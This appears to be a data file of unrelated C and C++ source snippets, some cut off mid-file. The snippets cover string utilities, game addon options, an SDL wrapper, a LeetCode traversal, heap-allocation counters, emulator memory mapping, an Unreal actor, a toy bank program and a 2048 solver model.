from n1 to n2, inclusive. If not, display\n// a suitable warning message.\n\nflag FErrorRange(CONST char *sz, int n, int n1, int n2)\n{\n  char szT[cchSzDef];\n\n  if (n < n1 || n > n2) {\n    sprintf(S(szT), \"%s value %d is out of range from %d to %d.\\n\",\n      sz, n, n1, n2);\n    PrintSz_W(szT);\n    return fTrue;\n  }\n  return fFalse;\n}\n\n\n// Copy bytes from one buffer to another. The buffers shouldn't overlap.\n\nvoid CopyRgb(CONST char *pbFrom, char *pbTo, long cb)\n{\n  while (cb--)\n    *pbTo++ = *pbFrom++;\n}\n\n\n// Return length of a zero terminated string, not including the terminator.\n\nint CchSz(CONST char *sz)\n{\n  CONST char *pch = sz;\n\n  while (*pch)\n    pch++;\n  return PD(pch - sz);\n}\n\n\n// Compare two strings case sensitively. Return 0 if equal, negative number if\n// first less than second, and positive number if first greater than second.\n\nint CompareSz(CONST char *sz1, CONST char *sz2)\n{\n  while (*sz1 && (*sz1 == *sz2))\n    sz1++, sz2++;\n  return (int)*sz1 - *sz2;\n}\n\n\n// Compare two strings case insensitively. Return 0 if equal, negative number\n// if first less than second, and positive if first greater than second.\n\nint CompareSzI(CONST char *sz1, CONST char *sz2)\n{\n  while (*sz1 && (ChCap(*sz1) == ChCap(*sz2)))\n    sz1++, sz2++;\n  return (int)ChCap(*sz1) - ChCap(*sz2);\n}\n\n\n// Compare two ranges of characters case sensitively. Return 0 if equal,\n// negative if first less than second, and positive if greater than second.\n\nint CompareRgch(CONST char *rgch1, int cch1, CONST char *rgch2, int cch2)\n{\n  while (cch1 > 0 && cch2 > 0 && *rgch1 == *rgch2)\n    rgch1++, rgch2++, cch1--, cch2--;\n  return cch1 > 0 ? (cch2 > 0 ? (int)*rgch1 - *rgch2 : (int)*rgch1) :\n    cch2 == 0 ? 0 : -(int)*rgch2;\n}\n\n\n// Compare two ranges of characters case insensitively. Return 0 if equal,\n// negative if first le",
    "#include \"Options.hpp\"\n#include \"Globals.hpp\"\n#include <fstream>\n#include <nlohmann/json.hpp>\n\nNLOHMANN_JSON_SERIALIZE_ENUM(SAT::Options::AttendenceMonitoringMode,\n{\n    { SAT::Options::AttendenceMonitoringMode::SingleSnapshot, \"SingleSnapshot\" },\n    { SAT::Options::AttendenceMonitoringMode::ContinuousRecording, \"ContinuousRecording\"}})\n\n// TODO: more granular handling of exceptions: filesystem and nlohmann::json\nvoid SAT::Options::Persist(std::filesystem::path file) const\n{\n    try\n    {\n        auto json = nlohmann::json();\n        json[\"ColumnSeparator\"] = ColumnSeparator;\n        json[\"RowSeparator\"] = RowSeparator;\n        json[\"AttendenceMonitoringMode\"] = MonitoringMode;\n        json[\"PeriodBetweenPresenceChecks\"] = PeriodBetweenPresenceChecks;\n        json[\"TabularizeAccountUUIDs\"] = TabularizeAccountUUIDs;\n        json[\"TabularizeAccountNames\"] = TabularizeAccountNames;\n        json[\"TabularizeCharacterNames\"] = TabularizeCharacterNames;\n        if (!std::filesystem::exists(file.parent_path()))\n        {\n            std::filesystem::create_directories(file.parent_path());\n        }\n        std::ofstream(file) << json;\n    }\n    catch (const std::exception &e)\n    {\n        G::APIDefs->Log(ELogLevel_WARNING, ADDON_NAME, e.what());\n        G::APIDefs->Log(ELogLevel_WARNING, ADDON_NAME, \"Unexpected error when persisting options\");\n    }\n}\n\nvoid SAT::Options::Parse(std::filesystem::path file)\n{\n    try\n    {\n        auto json = nlohmann::json::object();\n        if (std::filesystem::exists(file))\n        {\n            json = nlohmann::json::parse(std::ifstream(file), nullptr, false);\n        }\n        ColumnSeparator = json.value(\"ColumnSeparator\", ColumnSeparator);\n        RowSeparator = json.value(\"RowSeparator\", RowSeparator);\n        MonitoringMode = json.value(\"AttendenceMonitoringMode\", MonitoringMode);\n        PeriodBetweenPresenceChecks = json.value(\"PeriodBetweenPresenceChecks\", PeriodBetweenPresenceChecks);\n        TabularizeAccountUUIDs = json.value(\"TabularizeAccountUUIDs\", TabularizeAccountUUIDs);\n        TabularizeAccountNames = json.value(\"TabularizeAccountNames\", TabularizeAccountNames);\n        TabularizeCharacterNames = json.value(\"TabularizeCharacterNames\", TabularizeCharacterNames);\n    }\n    catch (const std::exception &e)\n    {\n        G::APIDefs->Log(ELogLevel_WARNING, ADDON_NAME, e.what());\n        G::APIDefs->Log(ELogLevel_WARNING, ADDON_NAME,\n                        \"Unexpected error when parsing options, falling back to defaults\");\n    }\n}\n",
    "#include <ranges>\n#include <vector>\n#include <concepts>\n#include <iterator>\n#include <utility>\n\n// -----------------------------------------------------\n// A simple concept to ensure we accept only range types\n// -----------------------------------------------------\ntemplate <typename T>\nconcept RangeType = std::ranges::input_range<T>;\n\n// -----------------------------------------------------\n// Query class that wraps a range and allows chaining\n// -----------------------------------------------------\ntemplate <RangeType R>\n    requires RangeType<std::decay_t<R>>\nclass Query {\nprivate:\n    // We store the range \"pipeline\" in data_\n    R data_;\n\npublic:\n    // -------------------------------------------------\n    // Constructor: takes ownership or reference of 'data'\n    // -------------------------------------------------\n    explicit Query(R data) : data_(std::move(data)) {}\n\n    // -------------------------------------------------\n    // where(...) \u2013 filters elements (like LINQ .Where)\n    //\n    // 'Pred' must be callable as: bool pred(range_reference_t<R>)\n    // and must satisfy the 'std::predicate' concept\n    // -------------------------------------------------\n    template <typename Pred>\n        requires std::predicate<Pred, std::ranges::range_reference_t<R>>\n    auto where(Pred pred) {\n        // Create a new filtered range using std::views::filter\n        auto filteredRange = data_ | std::views::filter(pred);\n        // Return a new Query with that filtered range\n        return Query<decltype(filteredRange)>(std::move(filteredRange));\n    }\n\n    // -------------------------------------------------\n    // select(...) \u2013 transforms elements (like LINQ .Select)\n    //\n    // 'Func' must be callable with the range's reference type\n    // -------------------------------------------------\n    template <typename Func>\n        requires std::regular_invocable<Func, std::ranges::range_reference_t<R>>\n    auto select(Func func) {\n        // Transform the range using std::views::transform\n        auto transformedRange = data_ | std::views::transform(func);\n        // Return a new Query with that transformed range\n        return Query<decltype(transformedRange)>(std::move(transformedRange));\n    }\n\n    // -------------------------------------------------\n    // toVector() \u2013 materialize the lazy pipeline into a std::vector\n    // -------------------------------------------------\n    auto toVector() {\n        // The final 'value type' might differ from the original input\n        using OutT = std::ranges::range_value_t<decltype(data_)>;\n        std::vector<OutT> result;\n        // Note: you can also use std::ranges::to if your STL/library supports it\n        for (auto&& elem : data_) {\n            result.push_back(elem);\n        }\n        return result;\n    }\n};\n\n// -----------------------------------------------------\n// Helper function \"from(...)\" to create a Query easily\n// -----------------------------------------------------\ntemplate <RangeType R>\n    requires RangeType<std::decay_t<R>>\nauto from(R&& range) {\n    using Decayed = std::decay_t<R>;\n    return Query<Decayed>(std::forward<R>(range));\n}\n",
    "    #include \"sdl.h\"\n\n    // Initialize the singleton instance to nullptr\n    SDL* SDL::instance = nullptr;\n    std::mutex SDL::mutex;\n     \n    // Private constructor ensures that only one instance can be created\n    SDL::SDL() : window(nullptr), renderer(nullptr) {}\n\n    // Static method to get the Singleton instance\n    SDL* SDL::getInstance() {\n        // automatically manage the lock scope\n        std::lock_guard<std::mutex> lock(mutex);\n        if (instance == nullptr) {\n            instance = new SDL();\n        }\n        return instance;\n    }\n\n    // Method to initialize SDL, create window and renderer\n    bool SDL::initialize(const char* title, int width, int height) {\n        // Initialize SDL\n        if (SDL_Init(SDL_INIT_VIDEO) != 0) {\n            std::cout << \"SDL_Init Error: \" << SDL_GetError() << std::endl;\n            return false;\n        }\n\n        // Create window\n        window = SDL_CreateWindow(title, SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, width, height, SDL_WINDOW_SHOWN);\n        if (window == nullptr) {\n            std::cout << \"SDL_CreateWindow Error: \" << SDL_GetError() << std::endl;\n            SDL_Quit();\n            return false;\n        }\n\n\n        renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED | SDL_RENDERER_PRESENTVSYNC);\n        if (renderer == nullptr) {\n            std::cout << \"SDL_CreateRenderer Error: \" << SDL_GetError() << std::endl;\n            SDL_DestroyWindow(window);\n            SDL_Quit();\n            return false;\n        }\n\n        return true;\n    }\n\n    // Getter for window\n    SDL_Window* SDL::getWindow() {\n        return window;\n    }\n\n    // Getter for renderer\n    SDL_Renderer* SDL::getRenderer() {\n        return renderer;\n    }\n\n    // Clean up SDL resources (window, renderer, SDL_Quit)\n    void SDL::cleanup() {\n        if (renderer) {\n            SDL_DestroyRenderer(renderer);\n            renderer = nullptr; //avoiding dangling pointer\n        }\n\n        if (window) {\n            SDL_DestroyWindow(window);\n            window = nullptr;\n        }\n\n        SDL_Quit();\n    }\n",
    "// leetcode : 144 \r\n// link : https://leetcode.com/problems/binary-tree-preorder-traversal\r\n// DFS\r\n#include<iostream>\r\n#include<climits>\r\n#include<queue>\r\n#include<vector>\r\nusing namespace std;\r\nclass TreeNode{ // This is tree node at LEETCODE\r\n    public:\r\n    int val;\r\n    TreeNode* left;\r\n    TreeNode* right;\r\n    TreeNode(int val){\r\n       this->val=val;\r\n       this->left=NULL;\r\n       this->right=NULL;\r\n    }\r\n};\r\n\r\nclass Solution {\r\npublic:\r\n    void helper(TreeNode* root,vector<int>& ans){\r\n        if(root==NULL) return ; // base call\r\n        ans.push_back(root->val); // root\r\n        helper(root->left,ans); // left\r\n        helper(root->right,ans); // right\r\n    }\r\n    vector<int> preorderTraversal(TreeNode* root) {\r\n        vector<int> ans;\r\n        helper(root,ans);\r\n        return ans;\r\n    }\r\n};\r\nTreeNode* construct(int arr[],int n){\r\n    queue<TreeNode*> q;\r\n    TreeNode* root = new TreeNode(arr[0]);\r\n    q.push(root);\r\n    int i=1;\r\n    int j=2;\r\n    while(q.size()>0 && i<n){\r\n        TreeNode* temp = q.front();\r\n        q.pop();\r\n        TreeNode* l;\r\n        TreeNode* r;\r\n        if(arr[i]!=INT_MIN) l=new TreeNode(arr[i]);\r\n        else l=NULL;\r\n        if(j!=n && arr[j]!=INT_MIN) r=new TreeNode(arr[j]);\r\n        else r=NULL;\r\n\r\n        temp->left=l;\r\n        temp->right=r;\r\n\r\n        if(l!=NULL) q.push(l);\r\n        if(r!=NULL) q.push(r);\r\n\r\n        i += 2;\r\n        j += 2;\r\n    }\r\n    return root;\r\n}\r\nint main(){\r\n  // Tree structure:\r\n    //             1\r\n    //           /   \\\r\n    //         2        3\r\n    //      /   \\     /   \\\r\n    //     4     5   6     7    \r\n    int arr[]={1,2,3,4,5,6,7};\r\n    int n=sizeof(arr)/sizeof(arr[0]);\r\n    TreeNode* root=construct(arr,n);\r\n    Solution sol;\r\n    vector<int> ans = sol.preorderTraversal(root);\r\n    for(int ele : ans){\r\n        cout<<ele<<\" \";\r\n    }\r\n}",
    "#include \"fiya-heap-measure.h\"\n\n/** You will need to define this function in your code. It must return a thread_local\n *  object in multithreaded program; otherwise it can create race conditions.\n */\nextern fiya::counter_interface_t<fiya::heap_usage_t> * get_heap_counter();\n\n/** This is a magic number we set when allocating a memory chunk\n *  and check when deallocating it. It enables us to detect\n *  chunks that we allocated compared to the ones that could\n *  have been allocated somehow else.\n */\nstatic constexpr uint32_t ALLOC_MAGIC_PATTERN {  0x4321cba9 };\n/** We use header to write the size of the chunk we allocated. The header\n *  is located 8 bytes before the allocated chunk.\n */\nstatic constexpr uint32_t HEADER_SIZE { 2U };\n\n/** Overload of operator new */\nvoid * operator new(std::size_t n) {\n    static constexpr std::size_t max_uint32 { \n        static_cast<std::size_t>(std::numeric_limits<uint32_t>::max())\n    };\n    /** Allocate the memory for the chunk, but also for the headers */\n    void * p = malloc(n + HEADER_SIZE * sizeof(uint32_t));\n    if (p == nullptr) {\n        throw std::bad_alloc();\n    }\n\n    uint32_t allocated_bytes { static_cast<uint32_t>(n > max_uint32 ? max_uint32 : n) };\n    uint32_t * pu { reinterpret_cast<uint32_t*>(p) };\n    pu[0] = ALLOC_MAGIC_PATTERN;\n    pu[1] = allocated_bytes;\n\n    fiya::counter_interface_t<fiya::heap_usage_t> * counter = get_heap_counter();\n    if (counter && !counter->recorder_internal_running()) {\n        fiya::heap_usage_t & hu = counter->cnt();\n\n        hu.total_allocations += static_cast<uint64_t>(allocated_bytes);\n        hu.current_allocations += static_cast<uint64_t>(allocated_bytes);\n        hu.peak_allocations = std::max(hu.peak_allocations, hu.current_allocations);\n    }\n\n    return reinterpret_cast<void*>(pu + 2);\n}\n\n/** Overload of operator delete */\nvoid operator delete(void * p)\n{\n    if (p == nullptr) {\n        return;\n    }\n\n    uint32_t* pu { reinterpret_cast<uint32_t*>(p) };\n    /** The header is 8 bytes before the memory chunk. */\n    pu -= 2;\n\n    fiya::counter_interface_t<fiya::heap_usage_t> * counter = get_heap_counter();\n    fiya::heap_usage_t* hu = nullptr;\n\n    if (counter && !counter->recorder_internal_running()) {\n        hu = &counter->cnt();\n    }\n\n    if (pu[0] == ALLOC_MAGIC_PATTERN) {\n        if (hu) {\n            uint32_t allocation_bytes { pu[1] };\n            hu->current_allocations -= static_cast<uint64_t>(allocation_bytes);\n        }\n        free(pu);\n    } else {\n        if (hu) {\n            hu->bad_deallocations += 1;\n        }\n        free(p);\n    }\n}",
    "/*\n * IO memory handling\n *\n * Copyright (c) 2016-2017 Fabrice Bellard\n * Copyright (C) 2018,2019, Esperanto Technologies Inc.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\")\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *   http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n *\n * THIS FILE IS BASED ON THE RISCVEMU SOURCE CODE WHICH IS DISTRIBUTED\n * UNDER THE FOLLOWING LICENSE:\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\n * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\n\n#include \"iomem.h\"\n\n#include <assert.h>\n#include <inttypes.h>\n#include <stdarg.h>\n#include <stdlib.h>\n#include <string.h>\n\n#include \"cutils.h\"\n#include \"dromajo.h\"\n\nstatic PhysMemoryRange *default_register_ram(PhysMemoryMap *s, uint64_t addr, uint64_t size, int devram_flags);\nstatic void             default_free_ram(PhysMemoryMap *s, PhysMemoryRange *pr);\nstatic const uint32_t * default_get_dirty_bits(PhysMemoryMap *map, PhysMemoryRange *pr);\nstatic void             default_set_addr(PhysMemoryMap *map, PhysMemoryRange *pr, uint64_t addr, BOOL enabled);\n\nPhysMemoryMap *phys_mem_map_init(void) {\n    PhysMemoryMap *s  = (PhysMemoryMap *)mallocz(sizeof(PhysMemoryMap));\n    s->register_ram   = default_register_ram;\n    s->free_ram       = default_free_ram;\n    s->get_dirty_bits = default_get_dirty_bits;\n    s->set_ram_addr   = default_set_addr;\n    return s;\n}\n\nvoid phys_mem_map_end(PhysMemoryMap *s) {\n    for (int i = 0; i < s->n_phys_mem_range; i++) {\n        PhysMemoryRange *pr = &s->phys_mem_range[i];\n        if (pr->is_ram) {\n            s->free_ram(s, pr);\n        }\n    }\n\n    free(s);\n}\n\n/* return NULL if not found */\n/* XXX: optimize */\nPhysMemoryRange *get_phys_mem_range(PhysMemoryMap *s, uint64_t paddr) {\n    for (int i = s->n_phys_mem_range - 1; i >= 0; --i) {\n        PhysMemoryRange *pr = &s->phys_mem_range[i];\n        if (paddr >= pr->addr && paddr < pr->addr + pr->size)\n            return pr;\n    }\n\n    return NULL;\n}\n\nPhysMemoryRange *register_ram_entry(PhysMemoryMap *s, uint64_t addr, uint64_t size, int devram_flags) {\n    PhysMemoryRange *pr;\n\n    assert(s->n_phys_mem_range < PHYS_MEM_RANGE_MAX);\n    assert((size & (DEVRAM_PAGE_SIZE - 1)) == 0 && size != 0);\n    pr               = &s->phys_mem_range[s->n_phys_mem_range++];\n    pr->map          = s;\n    pr->is_ram       = TRUE;\n    pr->devram_flags = devram_flags & ~DEVRAM_FLAG_DISABLED;\n    pr->addr         = addr;\n    pr->org_size     = size;\n    if (devram_flags & DEVRAM_FLAG_DISABLED)\n        pr->size = 0;\n    else\n        pr->size = pr->org_size;\n    pr->phys_mem   = NULL;\n    pr->dirty_bits = NULL;\n    return pr;\n}\n\nstatic PhysMemoryRange *default_register_ram(PhysMemoryMap *s, uint64_t addr, uint64_t size, int devram_flags) {\n    PhysMemoryRange *pr;\n\n    pr = register_ram_entry(s, addr, size, devram_flags);\n\n    pr->phys_mem = (uint8_t *)mallocz(size);\n    if (!pr->phys_mem) {\n        fprintf(dromajo_stderr, \"Could not allocate VM memory\\n\");\n        exit(1);\n    }\n\n    if (devram_flags & DEVRAM_FLAG_DIRTY_BITS) {\n        size_t nb_pages;\n        int    i;\n        nb_pages             = size >> DEVRAM_PAGE_SIZE_LOG2;\n        pr->dirty_bits_size  = ((nb_pages + 31) / 32) * sizeof(uint32_t);\n        pr->dirty_bits_index = 0;\n        for (i = 0; i < 2; i++) {\n            pr->dirty_bits_tab[i] = (uint32_t *)mallocz(pr->dirty_bits_size);\n        }\n        pr->dirty_bits = pr->dirty_bits_tab[pr->dirty_bits_index];\n    }\n    return pr;\n}\n\n/* return a pointer to the bitmap of dirty bits and reset them */\nstatic const uint32_t *default_get_dirty_bits(PhysMemoryMap *map, PhysMemoryRange *pr) {\n    uint32_t *dirty_bit",
    "// Fill out your copyright notice in the Description page of Project Settings.\r\n\r\n\r\n#include \"SanityRecovery.h\"\r\n#include \"Components/WidgetComponent.h\"\r\n#include \"NiagaraFunctionLibrary.h\"\r\n#include \"CapstoneCharacter.h\"\r\n\r\n// Sets default values\r\nASanityRecovery::ASanityRecovery()\r\n{\r\n \t// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\r\n\tPrimaryActorTick.bCanEverTick = true;\r\n\r\n\tMesh = CreateDefaultSubobject<UStaticMeshComponent>(TEXT(\"MESH\"));\r\n\r\n\tRootComponent = Mesh;\r\n\t\r\n\r\n\tUStaticMesh* SM_Object = Cast< UStaticMesh >(StaticLoadObject(UStaticMesh::StaticClass(), NULL, TEXT(\"StaticMesh'/Game/SICKA_mansion/StaticMeshes/SM_Candlestickfourside.SM_Candlestickfourside'\")));\r\n\tif (SM_Object) {\r\n\t\tMesh->SetStaticMesh(SM_Object);\r\n\t}\r\n\t\r\n\tstatic ConstructorHelpers::FObjectFinder<UNiagaraSystem> NE(TEXT(\"NiagaraSystem'/Game/SICKA_mansion/ParticleSystems/Particle_Fire_Emitter_System_1.Particle_Fire_Emitter_System_1'\"));\r\n\tif (NE.Succeeded())\r\n\t{\r\n\t\tSanityFXSystem = NE.Object;\r\n\t}\r\n\r\n\t// \u00bb\u00f3\u00c8\u00a3\u00c0\u00db\u00bf\u00eb UI\r\n\tInteractionWidget = CreateDefaultSubobject<UWidgetComponent>(TEXT(\"INTERACTIONWIDGET\"));\r\n\tInteractionWidget->SetupAttachment(Mesh);\r\n\tInteractionWidget->SetRelativeLocation(FVector(0, 0, 0));\r\n\tInteractionWidget->SetWidgetSpace(EWidgetSpace::Screen);\r\n\tstatic ConstructorHelpers::FClassFinder<UUserWidget> UI_Interaction(TEXT(\"/Game/UI/UI_Interaction.UI_Interaction_C\"));\r\n\tif (UI_Interaction.Succeeded())\r\n\t{\r\n\t\tInteractionWidget->SetWidgetClass(UI_Interaction.Class);\r\n\t\tInteractionWidget->SetDrawSize(FVector2D(50, 40));\r\n\t}\r\n\tInteractionWidget->SetVisibility(false);\r\n}\r\n\r\n// Called when the game starts or when spawned\r\nvoid ASanityRecovery::BeginPlay()\r\n{\r\n\tSuper::BeginPlay();\r\n\t\r\n\tSanityFXComponent = UNiagaraFunctionLibrary::SpawnSystemAtLocation(GetWorld(), SanityFXSystem, FVector(GetActorLocation().X, GetActorLocation().Y, GetActorLocation().Z + 60.0f));\r\n\r\n\tif (SanityFXComponent)\r\n\t{\r\n\t\tSanityFXComponent->Activate();\r\n\t}\r\n}\r\n\r\n// Called every frame\r\nvoid ASanityRecovery::Tick(float DeltaTime)\r\n{\r\n\tSuper::Tick(DeltaTime);\r\n\r\n}\r\n\r\nvoid ASanityRecovery::SetInteractionUIVisible(bool NewBool)\r\n{\r\n\tInteractionWidget->SetVisibility(NewBool);\r\n}\r\n\r\nvoid ASanityRecovery::Interaction()\r\n{\r\n\tACapstoneCharacter* Ch = Cast<ACapstoneCharacter>(UGameplayStatics::GetPlayerCharacter(this, 0));\r\n\tCh->SetSanity(Ch->GetSanity() + 10.0);\r\n\r\n\tDestroy();\r\n\tSanityFXComponent->Deactivate();\r\n}\r\n\r\n",
    "#include <bits/stdc++.h>\r\n\r\n// JAI SHREE RAM\r\n\r\nusing namespace std;\r\nclass bank\r\n{\r\npublic:\r\n    int code = 1234;\r\n    int amount = 10000;\r\n    int saving_amount = 50000;\r\n    // vector<int>v;\r\n\r\n    int cheak_code(int n)\r\n    {\r\n        if (n == code)\r\n        {\r\n            return 1;\r\n        }\r\n        else\r\n        {\r\n            return 0;\r\n        }\r\n    }\r\n    void saving_debit(int n)\r\n    {\r\n        saving_amount = saving_amount - n;\r\n        cout << saving_amount << endl;\r\n    }\r\n    void debit(int n)\r\n    {\r\n        amount = amount - n;\r\n        cout << amount << endl;\r\n    }\r\n    void saving_credit(int n)\r\n    {\r\n        saving_amount = saving_amount + n;\r\n        cout << saving_amount << endl;\r\n    }\r\n    void credit(int n)\r\n    {\r\n        amount = amount + n;\r\n        cout << amount << endl;\r\n    }\r\n    void saving_show()\r\n    {\r\n        cout << saving_amount << endl;\r\n    }\r\n    void show()\r\n    {\r\n        cout << amount << endl;\r\n    }\r\n    void show_payment(vector<int> v)\r\n    {\r\n        for (int i = 0; i < v.size(); i++)\r\n        {\r\n            cout << v[i] << ' ';\r\n            \r\n        }\r\n        cout<<endl;\r\n    }\r\n};\r\n\r\nint main()\r\n{\r\n\r\n    bank obj;\r\n    int n;\r\n    int amount;\r\n    vector<int> debit_current;\r\n    vector<int> debit_saving;\r\n    vector<int> credit_current;\r\n    vector<int> credit_saving;\r\n\r\n    cout << \"enter the code\" << endl;\r\n    cin >> n;\r\n    int a = obj.cheak_code(n);\r\n    if (a == 0)\r\n    {\r\n        cout << \"incorect code\" << endl;\r\n    }\r\n\r\n    int num;\r\n    int c;\r\n    if (a == 1)\r\n    {\r\n        while (true)\r\n        {\r\n\r\n            cout << \"enter a number\" << endl;\r\n            cout << \"1 : credit\\n\"\r\n                    \"2 : debit\\n\"\r\n                    \"3 : show amount\\n\"\r\n                    \"4 : show payment history\\n\"\r\n                    \"5 : exit\\n\"\r\n                 << endl;\r\n            cin >> num;\r\n\r\n            switch (num)\r\n            {\r\n            case 1:\r\n                cout << \"chose account\" << endl;\r\n                cout << \"1 : current account\\n\"\r\n                        \"2 : saving account\\n\";\r\n                cin >> c;\r\n\r\n                cout << \"enter amount\" << endl;\r\n                cin >> amount;\r\n                if (c == 2)\r\n                {\r\n                    credit_saving.push_back(amount);\r\n                    obj.saving_credit(amount);\r\n                    break;\r\n                }\r\n                else if (c == 1)\r\n                {\r\n                    credit_current.push_back(amount);\r\n                    obj.credit(amount);\r\n                    break;\r\n                }\r\n                else\r\n                {\r\n                    cout << \"jada dimah mat lagav (try again)\" << endl;\r\n                    break;\r\n                }\r\n\r\n            case 2:\r\n                cout << \"chose account\" << endl;\r\n                cout << \"1 : current account\\n\"\r\n                        \"2 : saving account\\n\";\r\n                cin >> c;\r\n                cout << \"enter amount\" << endl;\r\n                cin >> amount;\r\n                if (c == 2)\r\n                {\r\n                    if (amount > obj.saving_amount)\r\n                    {\r\n                        cout << \"know your limit\";\r\n                        break;\r\n                    }\r\n\r\n                    debit_saving.push_back(amount);\r\n                    obj.saving_debit(amount);\r\n                    break;\r\n                }\r\n                else if (c == 1)\r\n                {\r\n                    if (amount > obj.amount)\r\n                    {\r\n                        cout << \"aukat se jada bol rha hai\";\r\n                        break;\r\n                    }\r\n                    debit_current.push_back(amount);\r\n                    obj.debit(amount);\r\n                    break;\r\n                }\r\n                else\r\n                {\r\n                    cout << \"tyr again\" << endl;\r\n                    break;\r\n                }\r\n            case 3:\r\n                cout << \"chose account\" << endl;\r\n                cout << \"1 : current account\\n\"\r\n                        \"2 : saving account\\n\";\r\n                cin >> c;\r\n                if (c == 2)\r\n                {\r\n                    obj.saving_show();\r\n                    break;\r\n                }\r\n                else if (c == 1)\r\n                {\r\n                    obj.show();\r\n                    break;\r\n                }\r\n                else\r\n                {\r\n                    cout << \"try again\" << endl;\r\n                }\r\n            case 4:\r\n\r\n                int account;\r\n                cout << \"chose account\\n\"\r\n                        \"1 : current account\\n\"\r\n                        \"2 : saving account\\n\";\r\n                cin >> account;\r\n                if (account == 1)\r\n                {\r\n                    cout << \"debit : \";\r\n                    obj.show_payment(debit_current);\r\n                    cout << \"credit : \";\r\n                    obj.show_payment(credit_current);\r\n         ",
    "#include <vector>\n#include <cmath>\n\n#include <iostream>\n#include <iomanip>\n#include <string>\n#include <bitset>\n\n#include <cassert>\n#include <chrono>\n\n// DEBUG macros\n\n#ifdef DEBUG\n\n#define PRINT_TILE(x) std::cout << #x << \"= \" << std::setw(2) << ( 2 << x-1 )<< std::endl\n#define PRINT(x) std::cout << #x << \"= \" << x << std::endl\n#define OK() std::cout << \" OK at \" << __LINE__ << std::endl\n#define PRINT_GAMESTATE(x) print_gamestate(x)\n#define PRINT_MOVE(a) print_move(a)\n\n#else\n#define PRINT_TILE(x)\n#define PRINT(x)\n#define OK()\n#define PRINT_GAMESTATE(x)\n#define PRINT_MOVE(a)\n\n#endif\n\n// 2048 lite\n/******************/\n/* IN THIS MODEL: */\n/******************/\n// statespace is a grid of 2x3 of integers 0 and 1 to 5 representing 0 and 2^1 to 2^5\n\n// action is either\n// Up: swipe up ie \"compact\" blocks upward until impact on top edge while prioritising top 2 blocks in case of 3 similar blocks\n// Down: same but down\n// Left: same but right\n// Right: same but left\n// Note: action is illegal if no \"movement\" or \"fusion\" occurs\n\n// Offhand idea 1: maybe illegal moves are actually legal but give a penalty and use a finite turn ?\n// Or just uses a finite turn, but wouldn't that be bad for optimisation with duplicate states...\n// Conclusion: I don't think this is an actual concern, just make the move do nothing.\n\n// Complications: if action is illegal probability of transition is 0? - note: this seems irrelevant\n// Solution: instead of enumerating all unlikely scenarios and then noticing their transition is 0, enumerate \"neighbour\" situations using\n// a function that enumerates all empty squares after a move.\n\n// Other note: the game can be seen as guaranteed actions followed by probabilistic Nature's turns\n// Idea: introduce Nature as a \"player\" - ie list all empty squares after move\n\n// Idea 2: use pointers and a structure that can be traced back ? starting from a state,\n// eg empty board, list all possible nature moves, each corresponding to a state with an optimal move.\n// BUT: to find this optimal move, you need to come from the \"ending\"\n\n// Define endings function: all states with no more player moves (no \"movement\" or \"fusion\" possible in all 4 directions, ie kind of like no)\n// Good ending: ending that contains one (2 is not possible in 2x3) 32=2^5 square\n// Idea 3: start from ending states, and point to all possible Nature moves by finding 2=2^1 and 4=2^2 squares\n\n// Offhand idea 2: If we want a simpler test, make the goal variable and start less far from the end.\n\n\nenum action_type { Up, Down, Left, Right, None};\ntypedef std::vector<std::vector<int8_t>> state_type;\n// typedef std::vector<int8_t> state_size_type;\ntypedef double reward_type;\n\nstruct Coord {\n    int i;\n    int j;\n};\n\n// compactifying function:\n// takes Move (Up, Down, Left, Right) // do i add None? \n// eg Up: swipe up ie \"compact\" blocks upward until impact on top edge while prioritising top 2 blocks in case of 3 similar blocks\n\n// Question: return legal moves ? Or just modified gamestate ?\n// Since gamestate is small, just copy the gamestate and modify it\n\n\n/* shifting functions:\n * for use in algorithms\n * i and j are coordinates for tile to shift to (overwrites tile)\n * in other words: removes element in row or column and shifts all others,\n * adding 0 on the end\n * \n * @returns:\n *  bool: indicates wether non-zero values were shifted, used to test if move was legal\n */\n\ninline bool shift_up(int i, int j, int rows, int cols, state_type& gamestate){\n    bool moved_non_zero_tile = false;\n    int8_t new_value;\n    for (int i_rewrite = i; i_rewrite < rows-1; i_rewrite++) {\n        new_value = gamestate[i_rewrite+1][j];\n        gamestate[i_rewrite][j] = new_value;\n        if (new_value!=0) moved_non_zero_tile = true;\n    }\n    // insert a 0 at the end\n    gamestate[rows-1][j] = 0;\n    return moved_non_zero_tile;\n}\n\ninline bool shift_down(int i, int j, int rows, int cols, state_type& gamestate){\n    bool moved_non_zero_tile = false;\n    int8_t new_value;\n    for (int i_rewrite = i; i_rewrite > 0; i_rewrite--) {\n        new_value = gamestate[i_rewrite-1][j];\n        gamestate[i_rewrite][j] = new_value;\n        if (new_value!=0) moved_non_zero_tile = true;\n    }\n    // insert a 0 at the end\n    gamestate[0][j] = 0;\n    return moved_non_zero_tile;\n}\n\ninline bool shift_left(int i, int j, int rows, int cols, state_type& gamestate){\n    bool moved_non_zero_tile = false;\n    int8_t new_value;\n    for (int j_rewrite = 